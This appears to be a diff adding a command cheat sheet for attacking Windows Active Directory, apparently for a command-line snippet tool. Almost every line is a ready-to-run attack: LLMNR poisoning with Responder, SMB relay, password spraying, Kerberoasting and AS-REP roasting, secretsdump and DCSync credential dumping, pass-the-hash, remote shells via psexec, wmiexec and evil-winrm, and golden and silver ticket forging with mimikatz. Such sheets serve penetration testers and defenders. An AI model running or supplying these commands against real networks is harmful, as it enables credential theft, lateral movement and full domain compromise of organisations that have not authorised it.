@@ -1,0 +1,75 @@
+% ad, active-directory, kerberos, windows, netexec
+
+# Start Responder (LLMNR/NBT-NS poisoning)
+sudo responder -I <interface> -dwPv
+
+# SMB relay attack
+sudo ntlmrelayx.py -tf targets.txt -smb2support
+
+# Get domain users (NetExec - replacement for crackmapexec)
+nxc smb <dc_ip> -u <username> -p <password> --users
+
+# Get domain groups
+nxc smb <dc_ip> -u <username> -p <password> --groups
+
+# Password spray
+nxc smb <dc_ip> -u users.txt -p '<password>' --continue-on-success
+
+# Password spray multiple passwords
+nxc smb <dc_ip> -u users.txt -p passwords.txt --no-bruteforce --continue-on-success
+
+# Kerberoasting - Get TGS tickets
+GetUserSPNs.py <domain>/<username>:<password> -dc-ip <dc_ip> -request
+
+# AS-REP Roasting
+GetNPUsers.py <domain>/ -usersfile users.txt -dc-ip <dc_ip> -format hashcat
+
+# Dump secrets (admin required)
+secretsdump.py <domain>/<username>:<password>@<target>
+
+# Pass the hash
+psexec.py <domain>/<username>@<target> -hashes <lmhash>:<nthash>
+
+# Pass the hash with NetExec
+nxc smb <target> -u <username> -H <nthash>
+
+# DCSync attack
+secretsdump.py <domain>/<username>:<password>@<dc_ip> -just-dc
+
+# Get shell with psexec
+psexec.py <domain>/<username>:<password>@<target>
+
+# Get shell with wmiexec
+wmiexec.py <domain>/<username>:<password>@<target>
+
+# Get shell with evil-winrm
+evil-winrm -i <target> -u <username> -p <password>
+
+# BloodHound collection
+bloodhound-python -d <domain> -u <username> -p <password> -c all -ns <dc_ip>
+
+# PowerView - Get domain info
+Import-Module .\PowerView.ps1; Get-Domain
+
+# PowerView - Get domain users
+Get-DomainUser | select samaccountname
+
+# PowerView - Get domain computers
+Get-DomainComputer | select name
+
+# PowerView - Find domain admins
+Get-DomainGroupMember "Domain Admins"
+
+# Golden ticket with mimikatz
+mimikatz.exe "kerberos::golden /User:Administrator /domain:<domain> /sid:<domain_sid> /krbtgt:<krbtgt_hash> /ptt" "exit"
+
+# Silver ticket
+mimikatz.exe "kerberos::golden /User:Administrator /domain:<domain> /sid:<domain_sid> /target:<target> /service:<service> /rc4:<service_hash> /ptt" "exit"
+
+$ interface: ip link show | grep -E "^[0-9]" | cut -d: -f2 | tr -d ' ' | grep -v lo
+$ dc_ip: echo ""
+$ domain: echo ""
+$ username: echo ""
+$ password: echo ""
+$ target: echo ""
+$ nthash: echo ""
